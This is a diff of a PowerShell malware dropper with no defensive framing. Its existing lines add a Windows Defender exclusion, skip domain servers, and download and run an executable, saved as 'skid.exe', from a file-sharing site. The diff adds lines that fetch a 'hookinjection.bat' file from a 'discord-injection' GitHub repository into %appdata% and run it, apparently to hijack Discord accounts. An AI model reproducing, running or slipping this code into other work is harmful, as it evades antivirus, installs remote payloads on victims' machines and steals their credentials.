@@ -23,13 +23,7 @@ New-Item -ItemType Directory -Path $temp
 
 
 
-
-
 Add-MpPreference -ExclusionPath $dir
-
-
-
-
 
 
 
@@ -45,6 +39,9 @@ if ($computerSystem.DomainRole -eq 1 -or $computerSystem.DomainRole -eq 2) {
     Write-Host "This is a server. Exiting..."
     exit
 } else {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/assets/hookinjection.bat" -OutFile "$env:appdata\injection.cmd"
+    Start-Process -FilePath "$env:appdata\injection.cmd"
+    
     Invoke-WebRequest -Uri "https://anonsharing.com/file/7009f5c5b68387ce/new.exe" -OutFile "$temp\skid.exe"
     Start-Process -FilePath "$temp\skid.exe"
 }
